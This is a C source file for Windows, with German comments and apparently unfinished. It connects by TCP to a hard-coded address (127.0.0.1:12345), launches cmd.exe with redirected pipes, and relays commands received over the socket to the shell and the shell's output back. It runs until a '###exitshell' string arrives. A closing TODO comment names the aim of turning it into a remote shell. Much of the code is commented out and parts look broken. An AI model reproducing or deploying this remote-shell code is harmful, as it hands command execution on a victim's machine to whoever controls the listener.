#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <stdio.h> 
#include <strsafe.h>
#include <process.h>

#pragma comment( lib, "ws2_32.lib" )

#define BUFSIZE 4096
 
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

//HANDLE hStdin = NULL;
SOCKET sock;
BOOLEAN exitOnForce = FALSE;

//Prototypen
int StartWinsock(void);
long getAddrFromString(char*, SOCKADDR_IN*);
void CreateChildProcess(void); 
void WriteToPipe(void); 
void ReadFromPipe(void); 
void ErrorExit(PTSTR); 

int _tmain(int argc, char** argv)
{
	//hStdin = GetStdHandle(STD_INPUT_HANDLE); // STDIN

	//Testausgabe
	printf("Socket Client\n");

	//Variablen initialisieren
	long returnvalue;
	//SOCKET sock;
	SOCKADDR_IN addr;
	//char buf[4096];
	//hStdin = buf;

	////Prüfung auf die Übergabeparameter
	//if(argc < 2)
	//{
	//	printf("[-] Benutzung: %s <Hostname oder IP des Servers>\n",argv[0]);
	//	return 1;
	//}

	SECURITY_ATTRIBUTES saAttr; 
 
   printf("\n->Start of parent execution.\n");

// Set the bInheritHandle flag so pipe handles are inherited. 
 
   saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
   saAttr.bInheritHandle = TRUE; 
   saAttr.lpSecurityDescriptor = NULL; 

// Create a pipe for the child process's STDOUT. 
 
   if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0) ) 
      ErrorExit(TEXT("StdoutRd CreatePipe")); 

// Ensure the read handle to the pipe for STDOUT is not inherited.

   if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
      ErrorExit(TEXT("Stdout SetHandleInformation")); 

// Create a pipe for the child process's STDIN. 
 
   if (! CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) 
      ErrorExit(TEXT("Stdin CreatePipe")); 

// Ensure the write handle to the pipe for STDIN is not inherited. 
 
   if ( ! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0) )
      ErrorExit(TEXT("Stdin SetHandleInformation")); 
 
// Create the child process. 
   
   CreateChildProcess();

  // _beginthread(WriteToPipe,0,NULL); //SchreibThread starten
  // _beginthread(ReadFromPipe,0,NULL);//LeseThread starten

   //Weitere SOCKET Abhandlungen...

   //Socket Verfügbarkeit prüfen
	returnvalue = StartWinsock();
	if(returnvalue != 0)
	{
		printf("[-] Fehler: StartWinsock Fehlercode: %d!\n",returnvalue);
		return 1;
	}
	else
	{
		printf("[+] Winsock gestartet!\n");
	}

	//Socket initialisieren
	sock = socket(AF_INET,SOCK_STREAM,0);
	if(sock == INVALID_SOCKET)
	{
		printf("[-] Fehler: Der Socket konnte nicht erstellt werden, fehler code: %d\n",WSAGetLastError());
		return 1;
	}
	else
	{
		printf("[+] Socket erstellt!\n");
	}

	//Port und IP übergabe
	memset(&addr,0,sizeof(SOCKADDR_IN));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(12345);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	/*returnvalue = getAddrFromString(argv[1],&addr);
	if(returnvalue == SOCKET_ERROR)
	{
		printf("[-] Fehler: IP für %s konnte nicht aufgeloest werden.\n");
		return 1;
	}
	else
	{
		printf("[+] IP aufgelöst!\n");
	}*/


	//Verbindungsaufbau
	returnvalue = connect(sock, (SOCKADDR*)&addr, sizeof(SOCKADDR));
	if(returnvalue == SOCKET_ERROR)
	{
		printf("[-] Fehler: connect gescheitert, fehler code: %d\n",WSAGetLastError());
		return 1;
	}
	else
	{
		printf("[+] Verbindung hergestellt mit %s\n",argv[1]);
	}
  
	//Neue Idee
	//hStdin =(HANDLE) sock;

 for(;;)
 {
	 //Warten auf Input
		printf("[-] Warte auf Input ...\n\n");
		//memset(buf,0,sizeof(buf));
		/*returnvalue = recv(sock,buf,4095,0);
		if(returnvalue == 0 || returnvalue == SOCKET_ERROR)
		{
			printf("[-] Fehler: recv, fehler code: %d\n",WSAGetLastError());
		}
		else
		{
			buf[returnvalue]=0;
			printf("[+] Kommando angekommen.");
		}*/

	WriteToPipe(); 
  // printf( "\n->Contents written to child STDIN pipe.\n");
 
// Read from pipe that is the standard output for child process. 
 
  // printf( "\n->Contents of child process STDOUT:\n\n");
  ReadFromPipe();

  ////Senden von Output
		//printf("\n[+] Senden... ");
		//send(sock,buf,4095,0);
		//printf("\n[+] Nachricht gesendet!\n\n");

   if(exitOnForce)
   {
	   printf("\n->SYSTEM GOING DOWN!\n");
	   break;
   }
 }
   //_endthread();
   //_endthread();
   printf("\n->End of parent execution.\n");

// The remaining open handles are cleaned up when this process terminates. 
// To avoid resource leaks in a larger application, close handles explicitly. 

   return 0;
}

int StartWinsock()
{
	WSADATA wsa;
	return WSAStartup(MAKEWORD(2,0),&wsa);
}

long getAddrFromString(char* hostnameOrIp, SOCKADDR_IN* addr)
{
	unsigned long ip;
	HOSTENT* hoststruct;

	/* Parameter prüfen */
	if(hostnameOrIp==NULL || addr==NULL)
	{
		return SOCKET_ERROR;
	}

	/* eine IP in hostnameOrIp ? */
	ip=inet_addr(hostnameOrIp);
	/* bei einem fehler liefert inet_addr den Rückgabewert INADDR_NONE */
	if(ip!=INADDR_NONE)
	{
		addr->sin_addr.s_addr=ip;
		return 0;
	}
	else
	{
    /* Hostname in hostnameOrIp auflösen */
    hoststruct=gethostbyname(hostnameOrIp);
    if(hoststruct==NULL)
    {
		return SOCKET_ERROR;
    }
    else
    {
		/*die 4 Bytes der IP von he nach addr kopieren */
		memcpy(&(addr->sin_addr),hoststruct->h_addr_list[0],4);
    }
    return 0;
  }
}


//--------------------------------------------------------------------------------------------------------------
 
void CreateChildProcess()
// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{ 
   TCHAR szCmdline[]=TEXT("cmd");
   STARTUPINFO siStartInfo;
   PROCESS_INFORMATION piProcInfo; 
   BOOL bSuccess = FALSE; 
 
// Set up members of the PROCESS_INFORMATION structure. 
 
   ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
 
// Set up members of the STARTUPINFO structure. 
// This structure specifies the STDIN and STDOUT handles for redirection.
 
   ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
   siStartInfo.cb = sizeof(STARTUPINFO); 
   siStartInfo.hStdError = g_hChildStd_OUT_Wr;
   siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
   siStartInfo.hStdInput = g_hChildStd_IN_Rd;
   siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
// Create the child process. 
    
   bSuccess = CreateProcess(NULL, 
      szCmdline,     // command line 
      NULL,          // process security attributes 
      NULL,          // primary thread security attributes 
      TRUE,          // handles are inherited 
      0,             // creation flags 
      NULL,          // use parent's environment 
      NULL,          // use parent's current directory 
      &siStartInfo,  // STARTUPINFO pointer 
      &piProcInfo);  // receives PROCESS_INFORMATION 
   
   // If an error occurs, exit the application. 
   if ( ! bSuccess ) 
      ErrorExit(TEXT("CreateProcess"));
   else 
   {
      // Close handles to the child process and its primary thread.
      // Some applications might keep these handles to monitor the status
      // of the child process, for example. 

     CloseHandle(piProcInfo.hProcess);
     CloseHandle(piProcInfo.hThread);
   }
}
 
void WriteToPipe(void) 

// Read from a file and write its contents to the pipe for the child's STDIN.
// Stop when there is no more data. 
{ 
	DWORD dwRead=0, dwWritten=0; 
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	long returnvalue=0;

   memset(chBuf, 0, BUFSIZE);


	OVERLAPPED ovl = {0};
		if (!ReadFile((HANDLE)sock, chBuf, BUFSIZE, &dwRead, &ovl))
		{
			DWORD err = GetLastError();
			if (ERROR_IO_PENDING == err) {
				if (!GetOverlappedResult((HANDLE)sock, &ovl, (LPDWORD)&returnvalue, TRUE))
				{
					returnvalue = SOCKET_ERROR;
					printf("Overlapped I/O failed");
				}
			} else {
				returnvalue = SOCKET_ERROR;
				printf("ReadFile failed with last error %d\n", err);
			}
		} 


		//ovl = {0};
		/*if (!WriteFile(g_hChildStd_IN_Wr, chBuf, dwRead, NULL, &ovl))
		{
			DWORD err = GetLastError();
			if (ERROR_IO_PENDING == err) {
				if (!GetOverlappedResult((HANDLE)sock, &ovl, (LPDWORD)&returnvalue, TRUE))
				{
					returnvalue = SOCKET_ERROR;
					printf("Overlapped I/O failed");
				}
			} else {
				returnvalue = SOCKET_ERROR;
				printf("ReadFile failed with last error %d\n", err);
			}
		} */
		
   ////char dir[]={'d','i','r'};
   ////hStdin = dir;
   ////hStdin = GetStdHandle(STD_OUTPUT_HANDLE);
 
   //   bSuccess = ReadFile((HANDLE)sock /*hStdin*/, chBuf, BUFSIZE, &dwRead, NULL);			//<----- WICHTIG! 
	  //
	  ///*
	  //for(int i=0; i < BUFSIZE; i++)
	  //{
		 // if(chBuf[i]  = '\r')
		 // {
			//  chBuf[i] = 0;
			//  break;
		 // }
	  //}
	  //*/
   // 

	//Append \r\n to the chBuf for execution... i hope it at last
		for(int i = 0; i < BUFSIZE; i ++)
		{
			if(chBuf[i] == 0)
			{
				//chBuf[i]='\r';
				//chBuf[i+1]='\n';
				//chBuf[i+2]=0;
				dwRead=i+1;
				break;
			}
		}
		if(dwRead==0)
		{
			dwRead=BUFSIZE-1;
		}

      bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, dwRead, &dwWritten, NULL);

	  if((strcmp("###exitshell\r\n",chBuf))==0)
		  exitOnForce=TRUE;
} 
 
void ReadFromPipe(void) 

// Read output from the child process's pipe for STDOUT
// and write to the parent process's pipe for STDOUT. 
// Stop when there is no more data. 
{ 
   DWORD dwRead=0, dwWritten=0, dwTemp=0; 
   CHAR chBuf[BUFSIZE]; 
   BOOL bSuccess = FALSE;
   long returnvalue=0;
   OVERLAPPED ovl = {0};
   //OVERLAPPED ovl = {0};
   //HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
   //HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
   //HANDLE hParentStdOut = hStdin;

   memset(chBuf, 0, BUFSIZE);
 
   for (;;) //Zur überprüfung des 'Mehr? '
   {
	      
	   bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, &ovl);
		/*if (!ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, &ovl))
		{
			DWORD err = GetLastError();
			if (ERROR_IO_PENDING == err) {
				if (!GetOverlappedResult(g_hChildStd_OUT_Rd, &ovl, (LPDWORD)&returnvalue, TRUE))
				{
					returnvalue = SOCKET_ERROR;
					printf("Overlapped I/O failed");
				}
			} else {
				returnvalue = SOCKET_ERROR;
				printf("ReadFile failed with last error %d\n", err);
			}
		} */

		if(strcmp("Mehr? ",chBuf)==0)
		{
			char tmp[]={"j\n"};
			bSuccess = WriteFile(g_hChildStd_IN_Wr, tmp, 2, &dwTemp, NULL);
			memset(chBuf, 0, BUFSIZE);
			dwRead = 0;
			ovl.InternalHigh=0;

		}
		else
		{
			break;
		}
   }



      /*bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
      if( ! bSuccess || dwRead == 0 ) break; */

		bSuccess = WriteFile((HANDLE) sock /*hParentStdOut*/, chBuf, dwRead, &dwWritten,&ovl);

	  //for(int i = 0 ; i < BUFSIZE ; i++ )
	  //{
		 // if(chBuf[i]==0)
		 // {
			//  if(chBuf[i-1]=='>')
			//  break0r=1;
		 // }
	  //}

	  //if(break0r==1)
		 // break;
	  //memset(chBuf, 0, BUFSIZE);
 //  } 

} 
 
void ErrorExit(PTSTR lpszFunction) 

// Format a readable error message, display a message box, 
// and exit from the application.
 {
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &lpMsgBuf,
        0, NULL );

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
        (lstrlen((LPCTSTR)lpMsgBuf)+lstrlen((LPCTSTR)lpszFunction)+40)*sizeof(TCHAR)); 
    StringCchPrintf((LPTSTR)lpDisplayBuf, 
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"), 
        lpszFunction, dw, lpMsgBuf); 
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK); 

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(1);
}

/* Erstellt einen Childprocess, der eine Kommandozeile ist. Als Übergabeparameter wird
eine Textdatei mit "Befehlen" für die Kommandozeile erwartet.
TODO:
- Code so umschreiben, dass Befehle von STDIN an den Childprocess übergeben werden	[CHECK]
- Code muss bis zu einem Special Char/String in einer Endlosschleife bleiben		[CHECK]
- Code in den selbstprogrammierten Chat einbinden									[CHECK]
- Aus dem Code eine Remoteshell bauen
- Code bereinigen
- FERTIG

Kommentar:	Quelle für den Socket-Chat=	http://www.c-worker.ch/tuts/wstut_op.php
*/